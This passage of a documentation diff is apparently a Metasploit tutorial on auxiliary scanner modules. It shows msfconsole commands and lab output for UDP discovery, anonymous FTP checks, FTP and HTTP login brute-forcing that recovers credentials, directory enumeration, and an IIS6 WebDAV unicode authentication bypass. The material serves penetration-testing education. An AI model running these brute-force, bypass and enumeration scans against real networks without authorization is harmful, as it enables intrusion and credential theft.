+ [*] Scanned 114 of 253 hosts (045% complete)
+ [*] Scanned 140 of 253 hosts (055% complete)
+ [*] Scanned 160 of 253 hosts (063% complete)
+ [*] Scanned 184 of 253 hosts (072% complete)
+ [*] Scanned 243 of 253 hosts (096% complete)
+ [*] Scanned 250 of 253 hosts (098% complete)
+ [*] Scanned 253 of 253 hosts (100% complete)
+ [*] Auxiliary module execution completed
+ msf auxiliary(udp_probe) >
+
+
+As you can see in the above output, our quick little scan discovered many services running on a wide variety of platforms.
+
+**udp_sweep**
+
+The “udp_sweep” module scans across a given range of hosts to detect commonly available UDP services.
+
+::
+
+  msf > use auxiliary/scanner/discovery/udp_sweep
+ msf auxiliary(udp_sweep) > show options
+
+ Module options (auxiliary/scanner/discovery/udp_sweep):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   BATCHSIZE  256              yes       The number of hosts to probe in each set
+   RHOSTS                      yes       The target address range or CIDR identifier
+   THREADS    10               yes       The number of concurrent threads
+
+
+To configure this module, we just need to set the RHOSTS and THREADS values and run it.
+
+
+::
+
+  msf auxiliary(udp_sweep) > set RHOSTS 192.168.1.2-254
+ RHOSTS => 192.168.1.2-254
+ msf auxiliary(udp_sweep) > set THREADS 253
+ THREADS => 253
+ msf auxiliary(udp_sweep) > run
+
+ [*] Sending 10 probes to 192.168.1.2->192.168.1.254 (253 hosts)
+ [*] Discovered NetBIOS on 192.168.1.109:137 (SAMSUNG::U :SAMSUNG::U :00:15:99:3f:40:bd)
+ [*] Discovered NetBIOS on 192.168.1.150:137 (XEN-WIN7-PROD::U :WORKGROUP::G :XEN-WIN7-PROD::U :WORKGROUP::G :aa:e3:27:6e:3b:a5)
+ [*] Discovered NetBIOS on 192.168.1.203:137 (XEN-XP-SPLOIT::U :WORKGROUP::G :XEN-XP-SPLOIT::U :WORKGROUP::G :3e:ff:3c:4c:89:67)
+ [*] Discovered NetBIOS on 192.168.1.201:137 (XEN-XP-SP2-BARE::U :HOTZONE::G :XEN-XP-SP2-BARE::U :HOTZONE::G :HOTZONE::U :__MSBROWSE__::G :c6:ce:4e:d9:c9:6e)
+ [*] Discovered NetBIOS on 192.168.1.206:137 (XEN-XP-PATCHED::U :XEN-XP-PATCHED::U :HOTZONE::G :HOTZONE::G :12:fa:1a:75:b8:a5)
+ [*] Discovered NetBIOS on 192.168.1.250:137 (FREENAS::U :FREENAS::U :FREENAS::U :__MSBROWSE__::G :WORKGROUP::U :WORKGROUP::G :WORKGROUP::G :00:00:00:00:00:00)
+ [*] Discovered SNMP on 192.168.1.2:161 (GSM7224 L2 Managed Gigabit Switch)
+ [*] Discovered SNMP on 192.168.1.109:161 (Samsung CLX-3160 Series; OS V1.01.01.16 02-25-2008;Engine 6.01.00;NIC V4.03.08(CLX-3160) 02-25-2008;S/N 8Y61B1GP400065Y.)
+ [*] Discovered NTP on 192.168.1.69:123 (NTP v4)
+ [*] Discovered NTP on 192.168.1.99:123 (NTP v4)
+ [*] Discovered NTP on 192.168.1.201:123 (Microsoft NTP)
+ [*] Discovered NTP on 192.168.1.203:123 (Microsoft NTP)
+ [*] Discovered NTP on 192.168.1.206:123 (Microsoft NTP)
+ [*] Discovered MSSQL on 192.168.1.206:1434 (ServerName=XEN-XP-PATCHED InstanceName=SQLEXPRESS IsClustered=No Version=9.00.4035.00 tcp=1050 np=\\XEN-XP-PATCHED\pipe\MSSQL$SQLEXPRESS\sql\query )
+ [*] Discovered SNMP on 192.168.1.2:161 (GSM7224 L2 Managed Gigabit Switch)
+ [*] Discovered SNMP on 192.168.1.109:161 (Samsung CLX-3160 Series; OS V1.01.01.16 02-25-2008;Engine 6.01.00;NIC V4.03.08(CLX-3160) 02-25-2008;S/N 8Y61B1GP400065Y.)
+ [*] Scanned 253 of 253 hosts (100% complete)
+ [*] Auxiliary module execution completed
+ msf auxiliary(udp_sweep) >
+
+
+With minimal effort, we have once again identified a wide range of services running on many different platforms within our network.
+
+
+FTP
+"""""""""
+
+**anonymous**
+
+The “ftp/anonymous” scanner will scan a range of IP addresses searching for FTP servers that allow anonymous access and determines where read or write permissions are allowed.
+
+::
+
+  msf > use auxiliary/scanner/ftp/anonymous
+ msf auxiliary(anonymous) > show options
+
+ Module options:
+
+   Name     Current Setting      Required  Description
+   ----     ---------------      --------  -----------
+   FTPPASS  mozilla@example.com  no        The password for the specified username
+   FTPUSER  anonymous            no        The username to authenticate as
+   RHOSTS                        yes       The target address range or CIDR identifier
+   RPORT    21                   yes       The target port
+   THREADS  1                    yes       The number of concurrent threads
+
+
+Configuring the module is a simple matter of setting the IP range we wish to scan along with the number of concurrent threads and let it run.
+
+::
+
+  msf auxiliary(anonymous) > set RHOSTS 192.168.1.200-254
+ RHOSTS => 192.168.1.200-254
+ msf auxiliary(anonymous) > set THREADS 55
+ THREADS => 55
+ msf auxiliary(anonymous) > run
+
+ [*] 192.168.1.222:21 Anonymous READ (220 mailman FTP server (Version wu-2.6.2-5) ready.)
+ [*] 192.168.1.205:21 Anonymous READ (220 oracle2 Microsoft FTP Service (Version 5.0).)
+ [*] 192.168.1.215:21 Anonymous READ (220 (vsFTPd 1.1.3))
+ [*] 192.168.1.203:21 Anonymous READ/WRITE (220 Microsoft FTP Service)
+ [*] 192.168.1.227:21 Anonymous READ (220 srv2 Microsoft FTP Service (Version 5.0).)
+ [*] 192.168.1.204:21 Anonymous READ/WRITE (220 Microsoft FTP Service)
+ [*] Scanned 27 of 55 hosts (049% complete)
+ [*] Scanned 51 of 55 hosts (092% complete)
+ [*] Scanned 52 of 55 hosts (094% complete)
+ [*] Scanned 53 of 55 hosts (096% complete)
+ [*] Scanned 54 of 55 hosts (098% complete)
+ [*] Scanned 55 of 55 hosts (100% complete)
+ [*] Auxiliary module execution completed
+ msf auxiliary(anonymous) >
+
+
+**ftp_login**
+
+The “ftp_login” auxiliary module will scan a range of IP addresses attempting to log in to FTP servers.
+
+::
+
+  msf > use auxiliary/scanner/ftp/ftp_login
+ msf auxiliary(ftp_login) > show options
+
+ Module options (auxiliary/scanner/ftp/ftp_login):
+
+   Name              Current Setting                     Required  Description
+   ----              ---------------                     --------  -----------
+   BLANK_PASSWORDS   false                               no        Try blank passwords for all users
+   BRUTEFORCE_SPEED  5                                   yes       How fast to bruteforce, from 0 to 5
+   DB_ALL_CREDS      false                               no        Try each user/password couple stored in the current database
+   DB_ALL_PASS       false                               no        Add all passwords in the current database to the list
+   DB_ALL_USERS      false                               no        Add all users in the current database to the list
+   PASSWORD                                              no        A specific password to authenticate with
+   PASS_FILE         /usr/share/wordlists/fasttrack.txt  no        File containing passwords, one per line
+   Proxies                                               no        A proxy chain of format type:host:port[,type:host:port][...]
+   RECORD_GUEST      false                               no        Record anonymous/guest logins to the database
+   RHOSTS                                                yes       The target address range or CIDR identifier
+   RPORT             21                                  yes       The target port (TCP)
+   STOP_ON_SUCCESS   false                               yes       Stop guessing when a credential works for a host
+   THREADS           1                                   yes       The number of concurrent threads
+   USERNAME                                              no        A specific username to authenticate as
+   USERPASS_FILE                                         no        File containing users and passwords separated by space, one pair per line
+   USER_AS_PASS      false                               no        Try the username as the password for all users
+   USER_FILE                                             no        File containing usernames, one per line
+   VERBOSE           true                                yes       Whether to print output for all attempts
+
+
+This module can take both wordlists and user-specified credentials in order to attempt to login.
+
+::
+
+  msf auxiliary(ftp_login) > set RHOSTS 192.168.69.50-254
+ RHOSTS => 192.168.69.50-254
+ msf auxiliary(ftp_login) > set THREADS 205
+ THREADS => 205
+ msf auxiliary(ftp_login) > set USERNAME msfadmin
+ USERNAME => msfadmin
+ msf auxiliary(ftp_login) > set PASSWORD msfadmin
+ PASSWORD => msfadmin
+ msf auxiliary(ftp_login) > set VERBOSE false
+ VERBOSE => false
+ msf auxiliary(ftp_login) > run
+
+ [*] 192.168.69.51:21 - Starting FTP login sweep
+ [*] 192.168.69.50:21 - Starting FTP login sweep
+ [*] 192.168.69.52:21 - Starting FTP login sweep
+ ...snip...
+ [*] Scanned 082 of 205 hosts (040% complete)
+ [*] 192.168.69.135:21 - FTP Banner: '220 ProFTPD 1.3.1 Server (Debian) [::ffff:192.168.69.135]\x0d\x0a'
+ [*] Scanned 204 of 205 hosts (099% complete)
+ [+] 192.168.69.135:21 - Successful FTP login for 'msfadmin':'msfadmin'
+ [*] 192.168.69.135:21 - User 'msfadmin' has READ/WRITE access
+ [*] Scanned 205 of 205 hosts (100% complete)
+ [*] Auxiliary module execution completed
+ msf auxiliary(ftp_login) >
+
+
+As we can see, the scanner successfully logged in to one of our targets with the provided credentials.
+
+
+**ftp_version**
+
+The “ftp_version” module simply scans a range of IP addresses and determines the version of any FTP servers that are running.
+
+
+::
+
+  msf > use auxiliary/scanner/ftp/ftp_version
+ msf auxiliary(ftp_version) > show options
+
+ Module options:
+
+   Name     Current Setting      Required  Description
+   ----     ---------------      --------  -----------
+   FTPPASS  mozilla@example.com  no        The password for the specified username
+   FTPUSER  anonymous            no        The username to authenticate as
+   RHOSTS                        yes       The target address range or CIDR identifier
+   RPORT    21                   yes       The target port
+   THREADS  1                    yes       The number of concurrent threads
+
+
+To setup the module, we just set our RHOSTS and THREADS values and let it run.
+
+::
+
+  msf auxiliary(ftp_version) > set RHOSTS 192.168.1.200-254
+ RHOSTS => 192.168.1.200-254
+ msf auxiliary(ftp_version) > set THREADS 55
+ THREADS => 55
+ msf auxiliary(ftp_version) > run
+
+ [*] 192.168.1.205:21 FTP Banner: '220 oracle2 Microsoft FTP Service (Version 5.0).\x0d\x0a'
+ [*] 192.168.1.204:21 FTP Banner: '220 Microsoft FTP Service\x0d\x0a'
+ [*] 192.168.1.203:21 FTP Banner: '220 Microsoft FTP Service\x0d\x0a'
+ [*] 192.168.1.206:21 FTP Banner: '220 oracle2 Microsoft FTP Service (Version 5.0).\x0d\x0a'
+ [*] 192.168.1.216:21 FTP Banner: '220 (vsFTPd 2.0.1)\x0d\x0a'
+ [*] 192.168.1.211:21 FTP Banner: '220 (vsFTPd 2.0.5)\x0d\x0a'
+ [*] 192.168.1.215:21 FTP Banner: '220 (vsFTPd 1.1.3)\x0d\x0a'
+ [*] 192.168.1.222:21 FTP Banner: '220 mailman FTP server (Version wu-2.6.2-5) ready.\x0d\x0a'
+ [*] 192.168.1.227:21 FTP Banner: '220 srv2 Microsoft FTP Service (Version 5.0).\x0d\x0a'
+ [*] 192.168.1.249:21 FTP Banner: '220 ProFTPD 1.3.3a Server (Debian) [::ffff:192.168.1.249]\x0d\x0a'
+ [*] Scanned 28 of 55 hosts (050% complete)
+ [*] 192.168.1.217:21 FTP Banner: '220 ftp3 FTP server (Version wu-2.6.0(1) Mon Feb 28 10:30:36 EST 2000) ready.\x0d\x0a'
+ [*] Scanned 51 of 55 hosts (092% complete)
+ [*] Scanned 52 of 55 hosts (094% complete)
+ [*] Scanned 53 of 55 hosts (096% complete)
+ [*] Scanned 55 of 55 hosts (100% complete)
+ [*] Auxiliary module execution completed
+ msf auxiliary(ftp_version) >
+
+
+HTTP
+"""""""""
+
+**cert**
+
+The “cert” scanner module is a useful administrative scanner that allows you to cover a subnet to check whether or not server certificates are expired.
+
+::
+
+  msf > use auxiliary/scanner/http/cert
+ msf auxiliary(cert) > show options
+
+ Module options:
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   ISSUER   .*               yes       Show a warning if the Issuer doesn't match this regex
+   RHOSTS                    yes       The target address range or CIDR identifier
+   RPORT    443              yes       The target port
+   SHOWALL  false            no        Show all certificates (issuer,time) regardless of match
+   THREADS  1                yes       The number of concurrent threads
+
+
+To run the module, we just set our RHOSTS and THREADS values and let it do its thing.
+
+::
+
+  msf auxiliary(cert) > set RHOSTS 192.168.1.0/24
+ RHOSTS => 192.168.1.0/24
+ msf auxiliary(cert) > set THREADS 254
+ THREADS => 254
+ msf auxiliary(cert) > run
+
+ [*] 192.168.1.11 - '192.168.1.11' : 'Sat Sep 25 07:16:02 UTC 2010' - 'Tue Sep 22 07:16:02 UTC 2020'
+ [*] 192.168.1.10 - '192.168.1.10' : 'Wed Mar 10 00:13:26 UTC 2010' - 'Sat Mar 07 00:13:26 UTC 2020'
+ [*] 192.168.1.201 - 'localhost' : 'Tue Nov 10 23:48:47 UTC 2009' - 'Fri Nov 08 23:48:47 UTC 2019'
+ [*] Scanned 255 of 256 hosts (099% complete)
+ [*] Scanned 256 of 256 hosts (100% complete)
+ [*] Auxiliary module execution completed
+ msf auxiliary(cert) >
+
+
+The module output shows the certificate issuer, the issue date, and the expiry date.
+
+**dir_listing**
+
+The “dir_listing” module will connect to a provided range of web servers and determine if directory listings are enabled on them.
+
+::
+
+  msf > use auxiliary/scanner/http/dir_listing
+ msf auxiliary(dir_listing) > show options
+
+ Module options (auxiliary/scanner/http/dir_listing):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   PATH     /                yes       The path to identify directoy listing
+   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                    yes       The target address range or CIDR identifier
+   RPORT    80               yes       The target port (TCP)
+   SSL      false            no        Negotiate SSL/TLS for outgoing connections
+   THREADS  1                yes       The number of concurrent threads
+   VHOST                     no        HTTP server virtual host
+
+
+Note that the module can be set to search in a particular path but we will simply run it in its default configuration.
+
+
+::
+
+  msf auxiliary(dir_listing) > set RHOSTS 192.168.1.200-254
+ RHOSTS => 192.168.1.200-254
+ msf auxiliary(dir_listing) > set THREADS 55
+ THREADS => 55
+ msf auxiliary(dir_listing) > run
+
+ [*] NOT Vulnerable to directory listing http://192.168.1.209:80/
+ [*] NOT Vulnerable to directory listing http://192.168.1.211:80/
+ [*] Found Directory Listing http://192.168.1.223:80/
+ [*] NOT Vulnerable to directory listing http://192.168.1.234:80/
+ [*] NOT Vulnerable to directory listing http://192.168.1.230:80/
+ [*] Scanned 27 of 55 hosts (049% complete)
+ [*] Scanned 50 of 55 hosts (090% complete)
+ [*] Scanned 52 of 55 hosts (094% complete)
+ [*] Scanned 53 of 55 hosts (096% complete)
+ [*] Scanned 54 of 55 hosts (098% complete)
+ [*] Scanned 55 of 55 hosts (100% complete)
+ [*] Auxiliary module execution completed
+ msf auxiliary(dir_listing) >
+
+
+As can be seen in the above output, one of our scanned servers does indeed have directory listings enabled on the root of the server. Findings like these can turn into a gold mine of valuable information.
+
+
+**dir_scanner**
+
+The dir_scanner module scans one or more web servers for interesting directories that can be further explored.
+
+::
+
+  msf > use auxiliary/scanner/http/dir_scanner
+ msf auxiliary(dir_scanner) > show options
+
+ Module options (auxiliary/scanner/http/dir_scanner):
+
+   Name        Current Setting                                          Required  Description
+   ----        ---------------                                          --------  -----------
+   DICTIONARY  /usr/share/metasploit-framework/data/wmap/wmap_dirs.txt  no        Path of word dictionary to use
+   PATH        /                                                        yes       The path  to identify files
+   Proxies                                                              no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                                                               yes       The target address range or CIDR identifier
+   RPORT       80                                                       yes       The target port (TCP)
+   SSL         false                                                    no        Negotiate SSL/TLS for outgoing connections
+   THREADS     1                                                        yes       The number of concurrent threads
+   VHOST                                                                no        HTTP server virtual host
+
+
+We will accept the default dictionary included in Metasploit, set our target, and let the scanner run.
+
+::
+
+  msf auxiliary(dir_scanner) > set RHOSTS 192.168.1.201
+ RHOSTS => 192.168.1.201
+ msf auxiliary(dir_scanner) > run
+
+ [*] Using code '404' as not found for 192.168.1.201
+ [*] Found http://192.168.1.201:80/.../ 403 (192.168.1.201)
+ [*] Found http://192.168.1.201:80/Joomla/ 200 (192.168.1.201)
+ [*] Found http://192.168.1.201:80/cgi-bin/ 403 (192.168.1.201)
+ [*] Found http://192.168.1.201:80/error/ 403 (192.168.1.201)
+ [*] Found http://192.168.1.201:80/icons/ 200 (192.168.1.201)
+ [*] Found http://192.168.1.201:80/oscommerce/ 200 (192.168.1.201)
+ [*] Found http://192.168.1.201:80/phpmyadmin/ 200 (192.168.1.201)
+ [*] Found http://192.168.1.201:80/security/ 200 (192.168.1.201)
+ [*] Found http://192.168.1.201:80/webalizer/ 200 (192.168.1.201)
+ [*] Found http://192.168.1.201:80/webdav/ 200 (192.168.1.201)
+ [*] Scanned 1 of 1 hosts (100% complete)
+ [*] Auxiliary module execution completed
+ msf auxiliary(dir_scanner) >
+
+
+Our quick scan has turned up a number of directories on our target server that we would certainly want to investigate further.
+
+**dir_webdav_unicode_bypass**
+
+The “dir_webdav_unicode_bypass” module scans a given range of webservers and attempts to bypass the authentication using the WebDAV IIS6 Unicode vulnerability.
+
+::
+
+  msf > use auxiliary/scanner/http/dir_webdav_unicode_bypass
+ msf auxiliary(dir_webdav_unicode_bypass) > show options
+
+ Module options (auxiliary/scanner/http/dir_webdav_unicode_bypass):
+
+   Name        Current Setting                                          Required  Description
+   ----        ---------------                                          --------  -----------
+   DICTIONARY  /usr/share/metasploit-framework/data/wmap/wmap_dirs.txt  no        Path of word dictionary to use
+   ERROR_CODE  404                                                      yes       Error code for non existent directory
+   HTTP404S    /usr/share/metasploit-framework/data/wmap/wmap_404s.txt  no        Path of 404 signatures to use
+   PATH        /                                                        yes       The path to identify files
+   Proxies                                                              no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                                                               yes       The target address range or CIDR identifier
+   RPORT       80                                                       yes       The target port (TCP)
+   SSL         false                                                    no        Negotiate SSL/TLS for outgoing connections
+   THREADS     1                                                        yes       The number of concurrent threads
+   VHOST                                                                no        HTTP server virtual host
+
+
+We will keep the default DICTIONARY and HTTP404S dictionary settings, set our RHOSTS and THREADS values and let the module run.
+
+::
+
+  msf auxiliary(dir_webdav_unicode_bypass) > set RHOSTS 192.168.1.200-254
+ RHOSTS => 192.168.1.200-254
+ msf auxiliary(dir_webdav_unicode_bypass) > set THREADS 20
+ THREADS => 20
+ msf auxiliary(dir_webdav_unicode_bypass) > run
+
+ [*] Using code '404' as not found.
+ [*] Using code '404' as not found.
+ [*] Using code '404' as not found.
+ [*] Found protected folder http://192.168.1.211:80/admin/ 401 (192.168.1.211)
+ [*] 	Testing for unicode bypass in IIS6 with WebDAV enabled using PROPFIND request.
+ [*] Found protected folder http://192.168.1.223:80/phpmyadmin/ 401 (192.168.1.223)
+ [*] 	Testing for unicode bypass in IIS6 with WebDAV enabled using PROPFIND request.
+ [*] Found protected folder http://192.168.1.223:80/security/ 401 (192.168.1.223)
+ [*] 	Testing for unicode bypass in IIS6 with WebDAV enabled using PROPFIND request.
+ [*] Found protected folder http://192.168.1.204:80/printers/ 401 (192.168.1.204)
+ [*] 	Testing for unicode bypass in IIS6 with WebDAV enabled using PROPFIND request.
+ [*] 	Found vulnerable WebDAV Unicode bypass target http://192.168.1.204:80/%c0%afprinters/ 207 (192.168.1.204)
+ [*] Found protected folder http://192.168.1.203:80/printers/ 401 (192.168.1.203)
+ [*] 	Testing for unicode bypass in IIS6 with WebDAV enabled using PROPFIND request.
+ [*] 	Found vulnerable WebDAV Unicode bypass target http://192.168.1.203:80/%c0%afprinters/ 207 (192.168.1.203)
+ ...snip...
+ [*] Scanned 55 of 55 hosts (100% complete)
+ [*] Auxiliary module execution completed
+ msf auxiliary(dir_webdav_unicode_bypass) >
+
+
+Our scan has found vulnerable servers. This vulnerability can potentially allow us to list, download, or even upload files to password protected folders.
+
+**enum_wayback**
+
+The “enum_wayback” auxiliary module will query the archive.org site for any url’s that have been archived for a given domain. This can be useful for locating valuable information or for finding pages on a site that have since been unlinked.
+
+::
+
+  msf > use auxiliary/scanner/http/enum_wayback
+  msf auxiliary(enum_wayback) > show options
+
+ Module options:
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   DOMAIN                    yes       Domain to request URLS for
+   OUTFILE                   no        Where to output the list for use
+
+
+The only configuration item that we need to set is the DOMAIN value and then we let the scanner do its thing.
+
+::
+
+  msf auxiliary(enum_wayback) > set DOMAIN metasploit.com
+ DOMAIN => metasploit.com
+ msf auxiliary(enum_wayback) > run
+
+ [*] Pulling urls from Archive.org
+ [*] Located 1300 addresses for metasploit.com
+ http://metasploit.com/
+ http://metasploit.com/?
+ http://metasploit.com/?OS=CrossReference&SP=CrossReference
+ http://metasploit.com/?OS=Windows+2000
+ http://metasploit.com/?OS=Windows+2003
+ http://metasploit.com/?OS=Windows+NT
+ http://metasploit.com/?OS=Windows+XP
+ http://metasploit.com/?kangtatantakwa
+ http://metasploit.com/archive/framework/bin00000.bin
+ ...snip...
+ http://metasploit.com/projects/Framework/screenshots/v20_web_01_big.jpg
+ http://metasploit.com/projects/Framework/screenshots/v23_con_01_big.jpg
+ http://metasploit.com/projects/Framework/screenshots/v23_con_02_big.jpg
+ [*] Auxiliary module execution completed
+ msf auxiliary(enum_wayback) >
+
+
+**files_dir**
+
+The “files_dir” takes a wordlist as input and queries a host or range of hosts for the presence of interesting files on the target.
+
+::
+
+  msf > use auxiliary/scanner/http/files_dir
+ msf auxiliary(files_dir) > show options
+
+ Module options (auxiliary/scanner/http/files_dir):
+
+   Name        Current Setting                                           Required  Description
+   ----        ---------------                                           --------  -----------
+   DICTIONARY  /usr/share/metasploit-framework/data/wmap/wmap_files.txt  no        Path of word dictionary to use
+   EXT                                                                   no        Append file extension to use
+   PATH        /                                                         yes       The path  to identify files
+   Proxies                                                               no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                                                                yes       The target address range or CIDR identifier
+   RPORT       80                                                        yes       The target port (TCP)
+   SSL         false                                                     no        Negotiate SSL/TLS for outgoing connections
+   THREADS     1                                                         yes       The number of concurrent threads
+   VHOST                                                                 no        HTTP server virtual host
+
+
+The built-in DICTIONARY list will serve our purposes so we simply set our RHOSTS value and let the scanner run against our target.
+
+::
+
+  msf auxiliary(files_dir) > set RHOSTS 192.168.0.155
+ RHOSTS => 192.168.0.155
+ msf auxiliary(files_dir) > run
+
+ [*] Using code '404' as not found for files with extension .null
+ [*] Using code '404' as not found for files with extension .backup
+ [*] Using code '404' as not found for files with extension .bak
+ [*] Using code '404' as not found for files with extension .c
+ [*] Using code '404' as not found for files with extension .cfg
+ [*] Using code '404' as not found for files with extension .class
+ [*] Using code '404' as not found for files with extension .copy
+ [*] Using code '404' as not found for files with extension .conf
+ [*] Using code '404' as not found for files with extension .exe
+ [*] Using code '404' as not found for files with extension .html
+ [*] Found http://192.168.0.155:80/index.html 200
+ [*] Using code '404' as not found for files with extension .htm
+ [*] Using code '404' as not found for files with extension .ini
+ [*] Using code '404' as not found for files with extension .log
+ [*] Using code '404' as not found for files with extension .old
+ [*] Using code '404' as not found for files with extension .orig
+ [*] Using code '404' as not found for files with extension .php
+ [*] Using code '404' as not found for files with extension .tar
+ [*] Using code '404' as not found for files with extension .tar.gz
+ [*] Using code '404' as not found for files with extension .tgz
+ [*] Using code '404' as not found for files with extension .tmp
+ [*] Using code '404' as not found for files with extension .temp
+ [*] Using code '404' as not found for files with extension .txt
+ [*] Using code '404' as not found for files with extension .zip
+ [*] Using code '404' as not found for files with extension ~
+ [*] Using code '404' as not found for files with extension
+ [*] Found http://192.168.0.155:80/blog 301
+ [*] Found http://192.168.0.155:80/index 200
+ [*] Using code '404' as not found for files with extension
+ [*] Found http://192.168.0.155:80/blog 301
+ [*] Found http://192.168.0.155:80/index 200
+ [*] Scanned 1 of 1 hosts (100% complete)
+ [*] Auxiliary module execution completed
+ msf auxiliary(files_dir) >
+
+**http_login**
+
+The “http_login” module is a brute-force login scanner that attempts to authenticate to a system using HTTP authentication.
+
+::
+
+  msf > use auxiliary/scanner/http/http_login
+ msf auxiliary(http_login) > show options
+
+ Module options (auxiliary/scanner/http/http_login):
+
+   Name              Current Setting                                                           Required  Description
+   ----              ---------------                                                           --------  -----------
+   AUTH_URI                                                                                    no        The URI to authenticate against (default:auto)
+   BLANK_PASSWORDS   false                                                                     no        Try blank passwords for all users
+   BRUTEFORCE_SPEED  5                                                                         yes       How fast to bruteforce, from 0 to 5
+   DB_ALL_CREDS      false                                                                     no        Try each user/password couple stored in the current database
+   DB_ALL_PASS       false                                                                     no        Add all passwords in the current database to the list
+   DB_ALL_USERS      false                                                                     no        Add all users in the current database to the list
+   PASS_FILE         /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt      no        File containing passwords, one per line
+   Proxies                                                                                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   REQUESTTYPE       GET                                                                       no        Use HTTP-GET or HTTP-PUT for Digest-Auth, PROPFIND for WebDAV (default:GET)
+   RHOSTS                                                                                      yes       The target address range or CIDR identifier
+   RPORT             80                                                                        yes       The target port (TCP)
+   SSL               false                                                                     no        Negotiate SSL/TLS for outgoing connections
+   STOP_ON_SUCCESS   false                                                                     yes       Stop guessing when a credential works for a host
+   THREADS           1                                                                         yes       The number of concurrent threads
+   USERPASS_FILE     /usr/share/metasploit-framework/data/wordlists/http_default_userpass.txt  no        File containing users and passwords separated by space, one pair per line
+   USER_AS_PASS      false                                                                     no        Try the username as the password for all users
+   USER_FILE         /usr/share/metasploit-framework/data/wordlists/http_default_users.txt     no        File containing users, one per line
+   VERBOSE           true                                                                      yes       Whether to print output for all attempts
+   VHOST                                                                                       no        HTTP server virtual host
+
+
+To configure the module, we set the AUTH_URI setting to the path of the page requesting authentication, our RHOSTS value and to reduce output, we set the VERBOSE value to false.
+
+::
+
+  msf auxiliary(http_login) > set AUTH_URI /xampp/
+ AUTH_URI => /xampp/
+ msf auxiliary(http_login) > set RHOSTS 192.168.1.201
+ RHOSTS => 192.168.1.201
+ msf auxiliary(http_login) > set VERBOSE false
+ VERBOSE => false
+ msf auxiliary(http_login) > run
+
+ [*] Attempting to login to http://192.168.1.201:80/xampp/ with Basic authentication
+ [+] http://192.168.1.201:80/xampp/ - Successful login 'admin' : 's3cr3t'
+ [*] http://192.168.1.201:80/xampp/ - Random usernames are not allowed.
+ [*] http://192.168.1.201:80/xampp/ - Random passwords are not allowed.
+ [*] Scanned 1 of 1 hosts (100% complete)
+ [*] Auxiliary module execution completed
+ msf auxiliary(http_login) >
+
+As can be seen in the above output, our scan found a valid set of credentials for the directory.
+
+**open_proxy**
+
+The “open_proxy”‘ module scans a host or range of hosts looking for open proxy servers. This module helps mitigate false positives by allowing us to declare valid HTTP codes to determine whether a connection was successfully made.
+
+::
+
+  msf > use auxiliary/scanner/http/open_proxy
+ msf auxiliary(open_proxy) > show options
+
+ Module options (auxiliary/scanner/http/open_proxy):
+
+   Name           Current Setting           Required  Description
+   ----           ---------------           --------  -----------
+   CHECKURL       http://www.google.com     yes       The web site to test via alleged web proxy
+   MULTIPORTS     false                     no        Multiple ports will be used: 80, 443, 1080, 3128, 8000, 8080, 8123
+   Proxies                                  no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                                   yes       The target address range or CIDR identifier
+   RPORT          8080                      yes       The target port (TCP)
+   SSL            false                     no        Negotiate SSL/TLS for outgoing connections
+   THREADS        1                         yes       The number of concurrent threads
+   VALIDCODES     200,302                   yes       Valid HTTP code for a successfully request
+   VALIDPATTERN   302 Moved                 yes       Valid pattern match (case-sensitive into the headers and HTML body) for a successfully request
+   VERIFYCONNECT  false                     no        Enable CONNECT HTTP method check
+   VHOST                                    no        HTTP server virtual host
+
+
+We set our RHOSTS value to a small range of IP addresses and have the module scan port 8888 or proxy servers.
+
+::
+
+  msf auxiliary(open_proxy) > set RHOSTS 192.168.1.200-210
+ RHOSTS => 192.168.1.200-210
+ msf auxiliary(open_proxy) > set RPORT 8888
+ RPORT => 8888
+ msf auxiliary(open_proxy) > set THREADS 11
+ THREADS => 11
+ msf auxiliary(open_proxy) > run
+
+ [*] 192.168.1.201:8888 is a potentially OPEN proxy [200] (n/a)
+ [*] Scanned 02 of 11 hosts (018% complete)
+ [*] Scanned 03 of 11 hosts (027% complete)
+ [*] Scanned 04 of 11 hosts (036% complete)
+ [*] Scanned 05 of 11 hosts (045% complete)
+ [*] Scanned 11 of 11 hosts (100% complete)
+ [*] Auxiliary module execution completed
+ msf auxiliary(open_proxy) >
+
+
+**options**
+
+The “options” scanner module connects to a given range of IP address and queries any web servers for the options that are available on them. Some of these options can be further leveraged to penetrated the system.
+
+::
+
+  msf > use auxiliary/scanner/http/options
+ msf auxiliary(options) > show options
+
+ Module options (auxiliary/scanner/http/options):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                    yes       The target address range or CIDR identifier
+   RPORT    80               yes       The target port (TCP)
+   SSL      false            no        Negotiate SSL/TLS for outgoing connections
+   THREADS  1                yes       The number of concurrent threads
+   VHOST                     no        HTTP server virtual host
+
+
+We set our RHOSTS and THREADS value and let the scanner run.
+
+::
+
+  msf auxiliary(options) > set RHOSTS 192.168.1.200-210
+ RHOSTS => 192.168.1.200-254
+ msf auxiliary(options) > set THREADS 11
+ THREADS => 11
+ msf auxiliary(options) > run
+
+ [*] 192.168.1.203 allows OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK methods
+ [*] 192.168.1.204 allows OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK methods
+ [*] 192.168.1.205 allows OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK methods
+ [*] 192.168.1.206 allows OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK methods
+ [*] 192.168.1.208 allows GET,HEAD,POST,OPTIONS,TRACE methods
+ [*] 192.168.1.209 allows GET,HEAD,POST,OPTIONS,TRACE methods
+ [*] Scanned 55 of 55 hosts (100% complete)
+ [*] Auxiliary module execution completed
+ msf auxiliary(options) >
+
+
